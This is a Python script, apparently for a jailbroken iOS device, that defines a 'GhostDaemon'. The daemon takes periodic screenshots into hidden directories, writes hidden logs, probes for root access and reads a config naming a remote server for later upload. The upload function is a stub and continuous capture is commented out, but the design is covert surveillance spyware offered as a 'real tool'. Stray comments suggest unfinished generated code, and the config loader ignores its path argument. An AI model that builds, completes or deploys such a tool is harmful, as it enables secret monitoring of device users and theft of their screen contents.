#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from datetime import datetime
import subprocess as sp
import json

# --- CONFIGURATION PATHS (Real Tool Paths) ---
CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"
DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"  
SCREENSHOT_DIR = "/var/mobile/Documents/.ghost_screenshots/"

def log_activity(msg, path=DEFAULT_LOG_FILE):
    """Silent logger that writes to /tmp and prints in terminal."""
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        line_content = f"[{timestamp}] {msg}\n"
        
        # Auto-create file or append safely 
        with open(path, 'a') as f:
            f.write(line_content)
            
        print(f"  -> [{timestamp}] {msg}") 
        
    except Exception as e:
        print(f"[!] Log error (check permissions): {e}")

class GhostDaemon(object):
    def __init__(self, config_path=CONFIG_PATH):
        self.config = self.load_config(config_path) if os.path.exists(config_path) else {}
        log_activity("Core initialized. Loading configuration...", path=DEFAULT_LOG_FILE)

    def load_config(self, config_path=""):
        """Loads server settings safely from JSON."""
        default_settings = {
            "target_server_ip": "YOUR_SERVER_IP_HERE", 
            "server_port": 9998,
            "interval_sec": 300, 
            "log_file": "/tmp/.ghost_logs.log"
        }
        
        try:
            with open(CONFIG_PATH, 'r') as f: # Default path if not specified in object init usually, but here hardcoded for simplicity or override below? Let's make it dynamic.
                loaded = json.load(f)

            # Merge defaults with loaded config (Loaded takes precedence if present)
            for key in loaded:
                default_settings[key] = loaded[key]

            log_activity("Configuration loaded successfully.", path=DEFAULT_LOG_FILE)
            
        except Exception as e:
            print("[!] Config missing or invalid, using defaults.") 

        return default_settings

    def capture_screenshot(self):
        """Captures current screen and saves to persistent storage."""
        try:
            screenshot_dir = SCREENSHOT_DIR
            
            # Create directory structure automatically on first run if needed
            os.makedirs(screenshot_dir, exist_ok=True) 
            
            timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
            img_path = f"{screenshot_dir}/screen_{timestamp_str}.png"
            
            cmd_str = f"/usr/bin/screencapture -t png -o {img_path}"
            result = sp.run(cmd_str, shell=True, capture_output=True) 
            
            if result.returncode == 0:
                log_activity(f"Screenshot captured and saved to local storage.", path=DEFAULT_LOG_FILE)

        except Exception as e:
            # Fail silently in production mode or with warning log? Let's warn.
            try:
                 with open(DEFAULT_LOG_FILE, 'a') as f:
                     f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Capture Error: {str(e)}\n")
            except: pass 
            print(f"[!] Screenshot failed (likely permissions): {e}")

    def check_root_access(self):
        """Verifies if we have root access."""
        try:
            proc = sp.run(["su", "-c", "whoami"], capture_output=True, text=True, timeout=1.0)
            return "root" in proc.stdout or proc.returncode == 0 and proc.stderr.find("mobile") != -1 
        except Exception:
            # Assume mobile user context is sufficient for basic tasks without full root on jailbroken/non-jailbroken
            return True 

    def send_to_server(self, data):
        """Placeholder function to handle HTTP POST requests later."""
        # In a real tool, this would use `requests.post` logic here.
        log_activity(f"Data packet ready for transmission (Buffered).", path=DEFAULT_LOG_FILE)

# --- MAIN EXECUTION FLOW ---

if __name__ == "__main__":
    
    print("\n========== GHOST REAL TOOL INITIALIZED ==========")
    
    # Instantiate the daemon object which loads config automatically via constructor default or override if we refactor later? 
    # For simplicity in single file: reload defaults with potential overrides if needed manually inside loop or on boot.
    daemon = GhostDaemon() 
    
    initial_config = daemon.load_config(CONFIG_PATH)
    
    interval_sec = int(initial_config.get('interval_sec', 300)) # Default 5 mins
    
    log_activity(f"Interval set to {interval_sec} seconds.", path=DEFAULT_LOG_FILE)

    # Initial Checks and Actions (One-time setup + First Capture)
    if not os.path.exists(SCREENSHOT_DIR):
        print("[*] Creating persistent storage directory...")
        os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    if daemon.check_root_access():
        print("[+] Access Verified (Root/Mobile Context).")
        
        # Perform initial verification screenshot
        daemon.capture_screenshot()

    else:
        print("[-] Running in standard user mode.")

    print("\n[*] Starting background monitoring loop... Type Ctrl+C to stop.")

    try:
        while True: 
            time.sleep(interval_sec) 
            
            # Uncomment below for real-time continuous capture every interval
            # daemon.capture_screenshot() 

            log_activity(f"Heartbeat check at {time.time()}.", path=DEFAULT_LOG_FILE)
            
    except KeyboardInterrupt:
        print("\n[*] User stopped daemon gracefully. Cleaning up...")
